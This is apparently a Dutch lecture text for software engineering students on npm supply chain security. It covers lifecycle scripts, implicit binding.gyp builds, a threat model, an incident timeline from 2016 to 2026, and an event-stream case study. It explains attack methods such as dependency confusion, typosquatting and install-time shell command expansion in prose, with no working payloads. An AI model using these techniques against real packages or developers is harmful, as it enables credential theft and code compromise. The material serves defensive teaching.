# Supply Chain Security in het npm-ecosysteem

Oct 19, 2026 · @Andie

Elke `npm install` haalt code van honderden onbekenden binnen en voert een deel ervan meteen uit. Deze cursustekst begeleidt een hoorcollege van 45 minuten voor derdejaarsstudenten software engineering: van hoe npm werkt, over de grote aanvallen van 2016 tot 2026, tot de verdediging die je vandaag kan toepassen.

## Leerdoelen en lesplan

Na dit college kan je een npm-project beoordelen op supply chain-risico's en het concreet beveiligen. Meer specifiek kan je:

1. uitleggen wat een software supply chain is en waarom npm een aantrekkelijk doelwit is;
2. beschrijven hoe npm dependencies oplost, vastlegt en installeert, en op welke momenten daarbij code van derden wordt uitgevoerd;
3. de belangrijkste aanvalsvectoren benoemen en elk ervan koppelen aan een echt incident;
4. voor een gegeven incident analyseren welke maatregel het had gestopt of afgezwakt;
5. een beveiligingsplan opstellen voor een eigen project, zowel als gebruiker van packages als maintainer ervan.

**Voorkennis.** Je kent Git en GitHub, je hebt `npm install` al gebruikt en je weet wat `package.json` is. Basisbegrippen uit security (authenticatie, hashing, het principe van least privilege) worden bekend verondersteld.

**Tijdsindeling.** Het college duurt 45 minuten. Elk deel van deze tekst opent met een kernvraag; de casestudies krijgen de meeste tijd omdat ze de theorie concreet maken.

| Deel | Onderwerp | Tijd | Kernvraag |
| --- | --- | --- | --- |
| 1 | Waarom dit ertoe doet | 0:00–0:05 | Hoeveel vreemde code draait er in mijn project? |
| 2 | Hoe npm werkt | 0:05–0:12 | Wanneer wordt code van derden uitgevoerd? |
| 3 | Het dreigingsmodel | 0:12–0:18 | Waar in de keten kan een aanvaller binnenkomen? |
| 4 | Tijdlijn (4a) en casestudies (4b) | 0:18–0:30 | Wat leren echte aanvallen ons? |
| 5 | Verdediging als gebruiker | 0:30–0:36 | Hoe bescherm ik mijn project? |
| 6 | Verdediging als maintainer en in CI/CD | 0:36–0:40 | Hoe voorkom ik dat míjn package het wapen wordt? |
| 7 | Geavanceerd en vooruitblik | 0:40–0:43 | Waar gaat het ecosysteem naartoe? |
| – | Afsluiting en vragen | 0:43–0:45 | Wat neem ik mee? |

**Hoe je deze tekst leest.** Kaders met *Voor de docent* bevatten demo's, vragen aan de zaal en timingtips; je kan ze overslaan als je de tekst zelfstandig studeert. Elk deel eindigt met een *Kernpunt* dat je moet kunnen reproduceren op het examen.

**Meer dan 45 minuten.** Deze tekst bevat bewust meer dan je in één college kan vertellen. Onderdelen met *(verdieping)* in de titel behandel je niet in het college: ze zijn zelfstudie en achtergrond bij de oefeningen. De tijdlijn in deel 4a is naslag; in het college toon je alleen de vier fasen.

> **Voor de docent.** Voer live demo's uit in een wegwerpcontainer (`docker run --rm -it node:24 bash`), nooit op je eigen laptop met je echte npm- of GitHub-tokens. Dat is meteen de eerste les van het college.

## Deel 1 — Waarom dit ertoe doet (0:00–0:05)

*Kernvraag: hoeveel vreemde code draait er in mijn project?* Veel meer dan je eigen code: in een typische applicatie is het overgrote deel van de code open source die je nooit gelezen hebt.

### Een maandagochtend in september 2025

Op 8 september 2025 krijgt de maintainer van de packages `chalk` en `debug` een mail die van npm lijkt te komen: hij moet zijn tweestapsverificatie bijwerken, anders wordt zijn account vergrendeld. De link leidt naar een perfecte kopie van de npm-loginpagina. Hij vult zijn gebruikersnaam, wachtwoord en 2FA-code in. Kort daarna staan er kwaadaardige versies van 18 packages online die samen meer dan twee miljard keer per week gedownload worden.

Je hebt waarschijnlijk nog nooit bewust `chalk` of `debug` geïnstalleerd. Toch zitten ze vrijwel zeker in je projecten, diep in de dependency tree. Dat is het onderwerp van dit college: je software is zo veilig als de zwakste schakel in een keten die je niet ziet.

> **Voor de docent.** Toon een screenshot van de phishingmail (in de blogpost van Aikido, zie de bronnen) zonder te zeggen wat ze is en vraag: "Wie van jullie zou hier op klikken?" Onthul pas daarna wat er gebeurde. Het punt: de maintainer was geen beginner, hij was moe en had het druk.

### Wat is een software supply chain?

De **software supply chain** omvat alles wat tussen andermans broncode en jouw draaiende software zit: de packages zelf, de mensen die ze onderhouden, hun accounts, de registry, de build-pipelines en je eigen ontwikkel- en CI-omgeving.

Denk aan een autofabrikant. Die maakt zelf geen airbags, maar koopt ze bij een leverancier. Is de airbag defect, dan roept de fabrikant de auto's terug. In software ben jij de fabrikant en zijn packages de onderdelen. Het verschil: je haalt die onderdelen gratis bij anonieme vrijwilligers, je inspecteert ze niet, en ze worden automatisch vervangen door nieuwere versies.

Twee bekende incidenten buiten npm zetten het thema op de agenda. Bij **SolarWinds** (2020) werd het build-systeem van een softwareleverancier gekraakt, waarna duizenden klanten een update met een backdoor installeerden. **Log4Shell** (december 2021) toonde dat één kwetsbare open-sourcebibliotheek in vrijwel elke organisatie tegelijk een noodsituatie kan veroorzaken.

### Kwetsbaar of kwaadaardig: een cruciaal onderscheid

|  | Kwetsbare dependency | Kwaadaardige dependency |
| --- | --- | --- |
| Wat is het? | een onbedoelde fout in goedbedoelde code | code die opzettelijk schade doet |
| Voorbeeld | Log4Shell | de gekaapte versie van `debug` |
| Wanneer schadelijk? | als iemand de fout uitbuit | meteen bij installatie of uitvoering |
| Hoe vind of vermijd je het? | CVE-databanken, `npm audit` | gedragsanalyse, malwarescanners, vertraging |

Dit college gaat vooral over de rechterkolom. `npm audit` vertelt je welke gekende kwetsbaarheden je hebt; het beschermt je niet tegen een aanvaller die vanmiddag een nieuwe versie publiceert.

### Waarom npm het populairste doelwit is

- **Schaal.** De registry telt in oktober 2026 ruim 4,5 miljoen packagenamen. In 2024 verwerkte npm volgens Sonatype 4,5 biljoen downloadverzoeken.
- **Diepe bomen.** Een onderzoek van de TU Darmstadt (USENIX Security 2019) vond dat een gemiddeld npm-package impliciet 79 andere packages en 39 maintainers vertrouwt, en dat 20 maintaineraccounts samen meer dan de helft van het ecosysteem kunnen beïnvloeden.
- **Overal open source.** Volgens het Black Duck OSSRA-rapport 2026 bevat 98% van de onderzochte commerciële codebases open source, met gemiddeld 1.180 open-sourcecomponenten per applicatie, waarvan 64% transitief.
- **Code die vanzelf draait.** Install scripts voeren standaard code uit tijdens `npm install` (deel 2).
- **Waardevolle slachtoffers.** De laptop van een ontwikkelaar bevat de sleutels van het koninkrijk: cloudcredentials, npm- en GitHub-tokens, SSH-sleutels en soms cryptowallets.

Het resultaat: Sonatype telde in 2025 meer dan 454.600 nieuwe kwaadaardige open-sourcepackages, en meer dan 99% van alle open-sourcemalware die het dat jaar vond, zat op npm.

**Kernpunt.** Het grootste deel van de code in je applicatie heb je niet geschreven en niet gelezen. Supply chain security gaat over de vraag hoe je die code toch verantwoord kan vertrouwen, en wat je doet als dat vertrouwen beschaamd wordt.

## Deel 2 — Hoe npm werkt (0:05–0:12)

*Kernvraag: wanneer wordt code van derden uitgevoerd?* Het korte antwoord: veel eerder en veel vaker dan je denkt. Om aanvallen te begrijpen moet je eerst precies weten wat `npm install` doet.

### De spelers: registry, CLI en packages

"npm" is eigenlijk drie dingen: de **registry** (`registry.npmjs.org`, sinds 2020 eigendom van GitHub en dus Microsoft), de **CLI** die je lokaal draait, en de **website**. Alternatieve package managers zoals pnpm, Yarn en Bun gebruiken dezelfde registry.

Een **package** is een tarball (`.tgz`) met code plus metadata uit `package.json`: naam, versie, dependencies en scripts. Een package kan een **scope** hebben (`@angular/core`): een namespace die aan één gebruiker of organisatie toebehoort. Packages zonder scope delen één globale naamruimte waarin geldt: wie eerst komt, eerst maalt.

Het belangrijkste ontwerpprincipe: **iedereen mag publiceren, zonder voorafgaande review**. Een gratis account volstaat. Dat open model maakte npm groot, en het is meteen de reden dat dit college bestaat.

### Semver en version ranges

Versies volgen *semantic versioning*: `MAJOR.MINOR.PATCH`. In `package.json` staat zelden een exacte versie, maar een **range**:

| Notatie | Betekenis | Welke versies zijn toegelaten? |
| --- | --- | --- |
| `^1.2.3` | zelfde major | `>=1.2.3 <2.0.0` (standaard bij `npm install`) |
| `~1.2.3` | zelfde minor | `>=1.2.3 <1.3.0` |
| `1.2.3` | exact | alleen `1.2.3` |
| `*` | alles | elke versie, ook een kwaadaardige van vanavond |
| `latest` | geen range maar een *dist-tag* | de versie die de maintainer, of een aanvaller met zijn account, als nieuwste markeert |

Ranges zijn handig: bugfixes stromen automatisch binnen. Maar ze betekenen ook dat **een nieuwe versie die vandaag gepubliceerd wordt, morgen in jouw build kan zitten** zonder dat jij iets wijzigt. Vrijwel elke account-overname uit deel 4 werkte precies zo: de aanvaller publiceerde een nieuwe patch- of minorversie, en de ranges van miljoenen projecten pikten die op.

### De dependency tree

Je **directe dependencies** staan in jouw `package.json`. Zij hebben zelf dependencies, en die ook weer: de **transitieve dependencies**. npm lost die hele boom op en plaatst het resultaat zo plat mogelijk in `node_modules` (*hoisting* en *deduplicatie*).

Een concreet voorbeeld, gemeten op 19 oktober 2026: `npm install express` installeert **65 packages**, onderhouden door **36 verschillende npm-accounts**. Je typte één naam, maar je vertrouwt nu 36 mensen, hun wachtwoorden, hun laptops en hun CI-pipelines. Eén van die 65 is `debug`, dat in september 2025 werd gekaapt (deel 4).

Twee commando's om de boom te verkennen:

```bash
npm ls --all          # de volledige boom
npm explain debug     # waarom staat dit package hier?
```

### De lockfile: vertrouwen bevriezen

Bij de eerste installatie schrijft npm `package-lock.json`. Die legt per package de **exacte versie**, de **bron-URL** en een **integrity-hash** vast. Zo ziet de entry voor `debug` er vandaag uit in het express-project:

```json
"node_modules/debug": {
  "version": "4.4.3",
  "resolved": "https://registry.npmjs.org/debug/-/debug-4.4.3.tgz",
  "integrity": "sha512-RGwwWnwQvkVfavKVt22FGLw+xYSdzARwm0ru6DhTVA3umU5hZc28V3kO4stgYryrTlLpuvgI9GiijltAjNbcqA==",
  "dependencies": { "ms": "^2.1.3" }
}
```

De `integrity`-waarde is een SHA-512-hash van de tarball. Bij een volgende installatie controleert npm dat de gedownloade bytes exact overeenkomen. Twee commando's gaan daar verschillend mee om:

- `npm install` respecteert de lockfile, maar mag ze bijwerken als `package.json` iets anders vraagt.
- `npm ci` installeert **exact** wat in de lockfile staat, verwijdert eerst `node_modules`, en faalt als `package.json` en lockfile niet overeenkomen. Gebruik dit in CI en bij deployments.

Belangrijk om te snappen: een lockfile beschermt tegen **wijzigingen na het moment van locken**. Ze beschermt niet tegen een kwaadaardige versie die al in je lockfile zat toen je ze aanmaakte. De lockfile bevriest je vertrouwen; ze creëert het niet. Sinds 2016 is een gepubliceerde versie op npm bovendien onveranderlijk: hetzelfde versienummer kan nooit opnieuw met andere inhoud verschijnen. Daardoor zijn installaties vanuit een lockfile reproduceerbaar.

### Lifecycle scripts: code die draait tijdens de installatie

Hier zit de kern van het probleem. Een package kan in zijn `package.json` scripts declareren die npm tot en met versie 11 **automatisch uitvoert tijdens `npm install`**, voor elke dependency in de boom:

```json
{
  "name": "onschuldig-ogend-package",
  "version": "1.0.1",
  "scripts": {
    "preinstall": "node setup.js",
    "postinstall": "node telemetry.js"
  }
}
```

- `preinstall`, `install` en `postinstall` draaien bij elke installatie van dat package.
- `prepare` draait onder meer bij dependencies die rechtstreeks uit een Git-repository komen.
- Bevat een package een `binding.gyp`-bestand, dan voert npm impliciet `node-gyp rebuild` uit, ook zonder scripts-sectie.

Die scripts draaien **met jouw rechten**: ze zien je omgevingsvariabelen, je `~/.npmrc` met npm-token, je `~/.ssh`, je cloudcredentials en je browserprofielen. Er zijn legitieme redenen voor (native modules compileren, een binary downloaden), maar de meeste aanvallen in deel 4 gebruikten dit mechanisme als startschot.

**Nieuw sinds juli 2026.** npm 12 voert install scripts van dependencies niet langer automatisch uit: ze draaien alleen nog als je ze expliciet goedkeurt (deel 5). npm 11 kondigde dat sinds versie 11.16 al aan, met een waarschuwing bij elke installatie. Bun voert al jaren alleen scripts van een lijst vertrouwde packages uit, pnpm stopte ermee in januari 2025 en Yarn in april 2026. Toch blijft dit mechanisme essentieel om te begrijpen. Veel CI-images, tutorials en bedrijfsprojecten draaien nog npm 10 of 11, waar alles standaard wél draait. Elk script dat je goedkeurt, draait daarna opnieuw met jouw rechten. En de meeste aanvallen in deel 4 rekenden op het oude gedrag.

### binding.gyp: native code tijdens de installatie

Een `binding.gyp` is het bouwrecept van een *native addon*: een module in C of C++ die Node.js laadt alsof het JavaScript is. npm compileert die code tijdens de installatie. Dat is meestal heel gewoon, maar het verklaart ook waarom npm 12 die stap mee blokkeert.

**Waarvoor dient het normaal?** Sommige taken kan JavaScript niet, of niet snel genoeg. Denk aan functies van het besturingssysteem aanspreken (bestandswijzigingen volgen via FSEvents op macOS of inotify op Linux), een bestaande C-bibliotheek gebruiken (een database zoals SQLite of LMDB) of zwaar rekenwerk. Zo’n package bevat C/C++-broncode en een `binding.gyp`. Na het compileren staat er een `.node`-bestand: een gedeelde bibliotheek die je met `require()` laadt zoals elke andere module. Drie packages uit het voorbeeld in deel 5 werken zo: `@parcel/watcher` volgt bestandswijzigingen voor bundlers, `lmdb` is een snelle key-valuedatabase en `msgpackr-extract` decodeert MessagePack-data.

**Hoe ziet zo’n bestand eruit?** Dit is het ingekorte bouwrecept van `@parcel/watcher` 2.6.0. De syntax is die van een Python-dictionary:

```python
{
  "targets": [{
    "target_name": "watcher",
    "sources": [ "src/binding.cc", "src/Watcher.cc", "src/Backend.cc" ],
    "include_dirs": [ "<!(node -p \"require('node-addon-api').include_dir\")" ],
    "conditions": [
      ['OS=="mac"',   { "sources": [ "src/macos/FSEventsBackend.cc" ] }],
      ['OS=="linux"', { "sources": [ "src/linux/InotifyBackend.cc" ] }]
    ]
  }]
}
```

`target_name` is de naam van het resultaat (`build/Release/watcher.node`), `sources` zijn de C++-bestanden, en `conditions` kiest per besturingssysteem andere code. Het hulpprogramma `node-gyp` vertaalt dit recept naar een Makefile (Linux), een Xcode-project (macOS) of een Visual Studio-project (Windows) en compileert met de compiler op jouw machine. Daarvoor heb je Python, `make` en een C/C++-compiler nodig. Daarom faalt `npm install` soms met een lange node-gyp-foutmelding op een machine zonder die tools.

**Waarom tijdens de installatie?** Machinecode hangt af van het besturingssysteem, de processor (x64 of arm64) en soms de C-bibliotheek (glibc of musl). Eén tarball voor iedereen kan dus geen kant-en-klare machinecode bevatten. Node-API maakt een gecompileerde addon wel stabiel over Node.js-versies heen, maar nog altijd per platform.

**Het install script dat je niet ziet.** npm heeft een standaardregel: staat er een `binding.gyp` in de root van een package en heeft het geen eigen `install`- of `preinstall`-script, dan voert npm zelf `node-gyp rebuild` uit als install script. Een maintainer zet dat uit met `"gypfile": false` in `package.json`. Een package kan dus code laten draaien tijdens de installatie zonder één regel in zijn `scripts`-sectie.

**Kant-en-klare binaries zijn vandaag de norm.** Compileren bij elke installatie is traag en breekt snel. Daarom publiceren de meeste populaire native packages per platform een voorgecompileerde binary als apart package, bijvoorbeeld `@parcel/watcher-linux-x64-glibc` of `@lmdb/lmdb-darwin-arm64`. Die staan als `optionalDependencies` in `package.json`, en npm installeert alleen het package dat bij jouw platform past. Het install script compileert dan alleen nog als terugvaloptie: `@parcel/watcher` bouwt alleen als je er expliciet om vraagt (`npm_config_build_from_source=true`), `lmdb` en `msgpackr-extract` alleen als de meegeleverde binary niet werkt.

Dat verklaart ook een detail in de npm 11-waarschuwing van deel 5. Het label `install: node-gyp rebuild` is daar npm’s eigen afleiding uit het `binding.gyp`-bestand op schijf. De drie packages hebben in werkelijkheid een eigen install script dat eerst de kant-en-klare binary probeert.

**Waarom het een risico is.**

- *Bouwen is code uitvoeren.* GYP kent *command expansions*: wat tussen `<!(` en `)` staat, gaat naar de shell van het systeem, nog voor er iets gecompileerd wordt. Het voorbeeld hierboven start zo `node -p`; `msgpackr-extract` vraagt op die manier de versie van gcc op. Een kwaadaardig `binding.gyp` kan daar elk commando zetten. Ook *actions* in GYP voeren commando’s uit tijdens de build, en de gecompileerde C++ draait later met jouw rechten.
- *Onzichtbaar.* Wie alleen naar `scripts` in `package.json` kijkt, mist het impliciete install script. Daar speelde Phantom Gyp in 2026 op in (deel 4).
- *Moeilijk te beoordelen.* Het gaat om C/C++ en bouwconfiguratie, niet om JavaScript, en daar kijken de meeste reviewers niet naar.

**Wat doe je ermee?** `--ignore-scripts` en npm 12 slaan ook de impliciete build over: npm behandelt ze als een gewoon install script. Moet je een native package goedkeuren, kijk dan eerst of het kant-en-klare binaries meelevert. Vaak werkt het dan ook zonder goedkeuring, maar test dat. Keur je het toch goed, open dan het `binding.gyp`-bestand, zoek naar `<!(` en `actions`, en controleer wat er wordt uitgevoerd.

### Vier momenten waarop vreemde code draait

Install scripts zijn het bekendste moment, maar niet het enige. Wie alleen `--ignore-scripts` aanzet, is dus niet klaar.

| Moment | Wie voert de code uit | Wat staat er op het spel |
| --- | --- | --- |
| Installatie (lifecycle scripts) | npm, op je laptop of CI-runner | tokens, SSH-sleutels, cloudcredentials, broncode |
| Build, test, lint | bundler, testrunner en ESLint-plugins die het package inladen | dezelfde secrets, plus je build-output |
| Runtime op de server | Node.js in productie | klantdata, databasecredentials |
| In de browser van je eindgebruiker | gebundelde frontendcode | wallets, sessies, wat de gebruiker intypt |

### Publiceren: wie mag een nieuwe versie uitbrengen?

Een maintainer logt in met `npm login` en publiceert met `npm publish`. De CLI bewaart een **token** in `~/.npmrc`; in CI staat dat token als secret in de pipeline. Wie dat token heeft, *is* voor de registry de maintainer. Elke maintainer van een package kan elke versie publiceren, en één account beheert vaak tientallen packages.

De registry controleert bovendien niet of de tarball overeenkomt met de code op GitHub. **Wat je op GitHub leest, is niet noodzakelijk wat je installeert.** Daar komen we in deel 6 op terug met *provenance*.

> **Voor de docent.** Demo van 3 minuten in een wegwerpcontainer met `node:24`: `npm init -y && npm install express --ignore-scripts`. Lees in de output "added 65 packages" voor, toon met `npm explain debug` waarom `debug` erin zit, en open `package-lock.json`. Het aantal maintainers (36) bereken je op voorhand met een klein script over de lockfile en de registry-API en toon je op een slide: `npm view express maintainers` geeft alleen de maintainers van express zelf. Vraag aan de zaal: "Hoeveel van deze 36 mensen ken je?"

**Kernpunt.** npm draait op transitief vertrouwen. Door één package te installeren vertrouw je al zijn maintainers, hun accounts, hun pipelines en alle transitieve dependencies, en geef je hen codeuitvoering op je machine nog voor je één regel van hun code hebt gelezen.

## Deel 3 — Het dreigingsmodel (0:12–0:18)

*Kernvraag: waar in de keten kan een aanvaller binnenkomen?* Overal. Een software supply chain is een reeks schakels van de maintainer tot je eindgebruiker, en elke schakel is een ingang. Het diagram hieronder is de kaart voor de rest van het college.

&#91;embedded content: Dreigingsmodel · zes schakels met hun aanvalsvectoren\]

De rode stippellijn is de worm: Shai-Hulud gebruikte tokens die tijdens de installatie gestolen werden om nieuwe besmette versies op de registry te zetten. Zo voedt de keten zichzelf.

### Een vast analysekader per aanval

We ontleden elk incident in deel 4 met dezelfde vier vragen. Leer ze vanbuiten: het is ook de structuur van een goed incidentrapport.

1. **Toegang** — hoe kreeg de aanvaller de macht om code in de keten te brengen?
2. **Verspreiding** — hoe bereikte die code de slachtoffers?
3. **Payload** — wat deed de code eenmaal ze draaide?
4. **Detectie en respons** — wie merkte het op, hoe snel, en wat veranderde er daarna?

### De aanvalsvectoren

| Vector | Wat de aanvaller doet | Waarom het werkt | Voorbeeld |
| --- | --- | --- | --- |
| Typosquatting | publiceert een package met een naam die lijkt op een populaire | ontwikkelaars typen snel en lezen slecht | `crossenv` in plaats van `cross-env` (2017) |
| Slopsquatting | registreert namen die AI-assistenten verzinnen | ontwikkelaars kopiëren `npm install` uit een chat | PhantomRaven (2025) |
| Dependency confusion | publiceert de naam van een *intern* package op de publieke registry, met een hoger versienummer | een proxy-registry die interne en publieke packages samenvoegt, levert de hoogste versie | Alex Birsan (2021) |
| Accountovername | steelt of phisht het wachtwoord, de 2FA-code of het token van een maintainer | één account geeft publicatierecht op vele packages | eslint-scope (2018), chalk/debug (2025) |
| Overname via vertrouwen | wint het vertrouwen van een vermoeide maintainer en krijgt de sleutels | open source draait op onbetaalde vrijwilligers | event-stream (2018), xz-utils (2024) |
| Protestware | de maintainer saboteert zelf zijn package | niemand controleert wat een maintainer publiceert | colors en faker (2022), node-ipc (2022) |
| CI/CD-compromis | misbruikt een fout in de build-pipeline om tokens te stelen of te publiceren | pipelines hebben krachtige secrets en weinig toezicht | Nx s1ngularity (2025), tj-actions (2025) |
| Worm | gebruikt gestolen tokens van slachtoffers om hun eigen packages te besmetten | elk slachtoffer is ook een nieuwe uitvalsbasis | Shai-Hulud (2025) |
| Beschikbaarheid | verwijdert een package waarop iedereen bouwt | builds halen dependencies live van de registry | left-pad (2016) |

Twee vectoren verdienen extra uitleg, omdat ze geen enkel account kraken en toch werken.

**Typosquatting en slopsquatting.** Een aanvaller registreert `crossenv`, `expres` of `lodahs` en kopieert de echte code erin, aangevuld met een install script. Wie zich vertypt, merkt niets: alles werkt gewoon. Slopsquatting is de AI-variant: taalmodellen stellen soms packages voor die niet bestaan, en ze doen dat herhaalbaar. Een aanvaller die de verzonnen naam registreert, wacht gewoon op de volgende ontwikkelaar die het AI-advies blind uitvoert.

**Dependency confusion.** Bedrijven hebben interne packages, bijvoorbeeld `acme-auth`, op een private registry. Vaak staat daarvoor een *proxy-registry* die de interne packages en de publieke npm-registry samenvoegt tot één bron. Lekt de interne naam (via een `package.json` in een publieke repo of in gebundelde JavaScript), dan publiceert de aanvaller `acme-auth@99.0.0` op de publieke registry. Een slecht geconfigureerde proxy levert dan gewoon de hoogste versie: die van de aanvaller. De verdediging is eenvoudig: gebruik een scope die je zelf bezit, koppel die vast aan je private registry, en laat de proxy interne namen nooit publiek opzoeken (deel 5).

```ini
# .npmrc — alles onder @acme komt ALTIJD van de interne registry
@acme:registry=https://npm.intern.acme.example/
```

### Wat willen aanvallers?

De motieven bepalen de payload. In de incidenten van de laatste jaren zie je vijf drijfveren terug:

- **Geld via crypto**: wallets leeghalen of betalingsadressen vervangen (event-stream, chalk/debug, @solana/web3.js).
- **Credentials als springplank**: tokens en cloudsleutels stelen om verder in te breken of de toegang door te verkopen (Shai-Hulud, Nx).
- **Staatsactoren**: Noord-Koreaanse groepen richten zich al jaren op ontwikkelaars om crypto en toegang te stelen, onder meer via nep-sollicitatiegesprekken met een "opdracht" die een kwaadaardig npm-package installeert.
- **Protest en sabotage**: de maintainer zelf wil een statement maken (colors, node-ipc).
- **Onderzoek en bug bounties**: dependency confusion werd door een onderzoeker ontdekt die er beloningen voor kreeg.

> **Voor de docent.** Laat de zaal het diagram lezen en vraag: "Welke schakel controleer jij vandaag zelf?" Het eerlijke antwoord is meestal geen enkele. Gebruik dat als brug naar de casestudies.

**Kernpunt.** Een aanvaller hoeft jouw systemen niet aan te vallen. Hij valt de zwakste schakel aan die jij vertrouwt, en laat jouw eigen `npm install` het werk doen.

## Deel 4a — Tijdlijn van incidenten 2016–2026 (0:18–0:20)

*Kernvraag: wat leren echte aanvallen ons?* Dat aanvallers in tien jaar evolueerden van gelegenheidsdieven naar georganiseerde groepen en staatsactoren met zelfverspreidende wormen. De tabel staat chronologisch, zodat je die evolutie ziet; download- en schaalcijfers zijn schattingen van de vermelde onderzoekers op het moment van het incident.

| Datum | Incident | Vector (zie deel 3) | Wat er gebeurde | Schaal |
| --- | --- | --- | --- | --- |
| mrt 2016 | left-pad | beschikbaarheid | maintainer verwijdert 273 packages na een naamsconflict met Kik; builds wereldwijd breken 2,5 uur | \~2,5 mln downloads per maand |
| jul 2017 | crossenv e.a. | typosquatting | \~40 packages van "hacktask" sturen omgevingsvariabelen door | enkele tientallen echte installaties |
| jul 2018 | eslint-scope | accountovername | hergebruikt wachtwoord zonder 2FA; script steelt `~/.npmrc`-tokens, npm trekt alle tokens in | \~4.500 accounts mogelijk blootgesteld |
| okt 2018 | event-stream | overname via vertrouwen | gerichte backdoor tegen de Copay-wallet | \~2 mln downloads per week |
| feb 2021 | Alex Birsan | dependency confusion | onderzoeker voert code uit bij 35+ bedrijven | >130.000 dollar aan bounties |
| okt 2021 | ua-parser-js | accountovername | cryptominer en wachtwoordsteler, \~4 uur online | >7 mln downloads per week |
| nov 2021 | coa en rc | accountovername | wachtwoordsteler; breekt React-builds wereldwijd | \~23 mln downloads per week samen |
| jan 2022 | colors en faker | protestware | maintainer saboteert eigen packages met een oneindige lus | colors >20 mln downloads per week |
| mrt 2022 | node-ipc | protestware | overschrijft bestanden op Russische en Belarussische IP-adressen | \~1 mln downloads per week |
| jun 2023 | manifest confusion | ontwerpfout in de registry | metadata op de registry en `package.json` in de tarball kunnen verschillen | hele registry |
| mrt 2024 | xz-utils (Linux, niet npm) | overname via vertrouwen | backdoor na ruim twee jaar opgebouwd vertrouwen, net op tijd ontdekt | bijna elke Linux-distributie |
| jun 2024 | polyfill.io | overname van een CDN-domein | nieuwe eigenaar injecteert redirects in websites | >100.000 websites |
| okt 2024 | @lottiefiles/lottie-player | accountovername (gestolen token) | crypto-drainer op websites; één slachtoffer verliest 10 BTC | \~94.000 downloads per week |
| dec 2024 | @solana/web3.js | accountovername (phishing) | steelt private keys, \~5 uur online | \~130.000 dollar gestolen |
| dec 2024 | @rspack/core | accountovername (gestolen token) | cryptominer, \~1 uur online | \~400.000 downloads per week |
| mrt 2025 | tj-actions/changed-files | CI/CD-compromis | gekaapte GitHub Action zet secrets in publieke buildlogs | >23.000 repositories |
| jul 2025 | eslint-config-prettier e.a. | accountovername (phishing via npnjs.com) | Windows-malware via install script | \~30 mln downloads per week |
| aug 2025 | Nx s1ngularity | CI/CD-compromis | malware misbruikt lokale AI-tools en publiceert secrets | 2.349 gelekte secrets |
| sep 2025 | chalk, debug e.a. | accountovername (phishing via npmjs.help) | crypto-clipper in de browser | >2 mld downloads per week |
| sep 2025 | Shai-Hulud | worm | verspreidt zich met gestolen npm-tokens | >500 packages |
| okt 2025 | PhantomRaven | slopsquatting | payload pas tijdens installatie opgehaald via een URL-dependency, onzichtbaar voor scanners | 126 packages |
| nov 2025 | Shai-Hulud 2.0 | worm | `preinstall`, eigen runtime, wiper als terugvaloptie | 796 packages, >25.000 repositories |
| feb–apr 2026 | TeamPCP-cascade | CI/CD-compromis | Trivy, CanisterWorm, Checkmarx, LiteLLM, Bitwarden CLI | tientallen projecten in npm en PyPI |
| mrt 2026 | axios | accountovername (malware op de laptop van de maintainer) | backdoor via een nieuwe dependency; toegeschreven aan Noord-Korea | >70 tot >100 mln downloads per week |
| mei 2026 | TanStack (Mini Shai-Hulud) | CI/CD-compromis en worm | vergiftigde CI-cache; worm met geldige provenance | 373 versies van 169 packages |
| jun 2026 | Mastra | accountovername | typosquat-dependency met implantaat; toegeschreven aan Noord-Korea | 140+ packages |
| aug 2026 | ChainDrop | worm | begint bij een gekaapt GitHub-account; gebouwd op de publiek gemaakte TeamPCP-code | ≥444 packages, >2 mld downloads per maand |
| okt 2026 | tensorlake | kwaadaardige commit | dodemansknop: wist je thuismap als je het token intrekt | één package, nieuwe techniek |

### Vier fasen

1. **2016–2020, de naïviteit.** Het ecosysteem ontdekt dat één persoon het internet kan breken (left-pad) en dat niemand controleert wie publiceert. Aanvallen zijn meestal opportunistisch; event-stream is de eerste gerichte uitzondering.
2. **2021–2022, de accountovernames.** Populaire packages worden gekaapt via zwakke accounts; maintainers keren zich soms tegen hun eigen gebruikers. npm maakt 2FA verplicht voor de populairste packages.
3. **2023–2025, de industrialisering.** Ontwerpfouten in de registry komen aan het licht, gevolgd door gerichte phishingcampagnes, aanvallen op CI-pipelines en de eerste wormen. npm schaft klassieke tokens af.
4. **2026, de staatsactoren en commodity-wormen.** Noord-Korea richt zich op individuele maintainers, de code van wormen ligt publiek, en aanvallers misbruiken trusted publishing en provenance zelf.

> **Voor de docent.** Toon niet de volledige tabel, maar alleen de vier fasen op een slide, en loop er in twee minuten doorheen. De tabel is naslag voor de studenten.

## Deel 4b — Casestudies in de diepte (0:20–0:30)

Zes casestudies, gekozen omdat ze samen bijna alle schakels uit het dreigingsmodel raken; de laatste bundelt de golf aanvallen van 2026. Ze zijn chronologisch geordend, zodat je ook ziet hoe aanvallers leren.

> **Voor de docent.** Je hebt tien minuten. Behandel event-stream, Nx, chalk/debug, Shai-Hulud en axios in ongeveer twee minuten elk. Dependency confusion ken je al uit deel 3, en de onderdelen met de vermelding verdieping zijn zelfstudie.

### Casestudie 1 — event-stream (2018): de vriendelijke vrijwilliger

`event-stream` was een populaire bibliotheek voor streams in Node.js, met ongeveer 2 miljoen downloads per week en 3.931 packages die ervan afhingen. De oorspronkelijke maintainer, Dominic Tarr, gebruikte het zelf al jaren niet meer en verdiende er niets aan. Toen een onbekende met de naam *right9ctrl* aanbood het onderhoud over te nemen, zei hij ja. Later schreef hij: "he emailed me and said he wanted to maintain the module, so I gave it to him."

- **Toegang.** Geen hack: sociale manipulatie. De aanvaller kreeg legitiem publicatierecht.
- **Verspreiding.** Op 9 september 2018 voegde hij een nieuwe dependency toe, `flatmap-stream`. Op 5 oktober verscheen daarvan versie 0.1.1 met kwaadaardige code, die via de ranges automatisch bij gebruikers terechtkwam.
- **Payload.** De code was versleuteld met AES. De sleutel was de beschrijving van het project dat het package installeerde. Alleen bij "A Secure Bitcoin Wallet", de beschrijving van de Copay-wallet, ontcijferde de code zichzelf. Tijdens de build van Copay (versies 5.0.2 tot 5.1.0) injecteerde ze code die wallets met meer dan 100 BTC of 1.000 BCH leegroofde. Voor alle andere projecten deed ze niets. De code zat bovendien alleen in de geminificeerde versie van het gepubliceerde npm-package, waar bijna niemand naar kijkt.
- **Detectie en respons.** Pas op 20 november 2018, ruim zes weken na de kwaadaardige release, opende een ontwikkelaar issue #116 op GitHub. Op 26 november verwijderde npm de packages en nam het event-stream over.

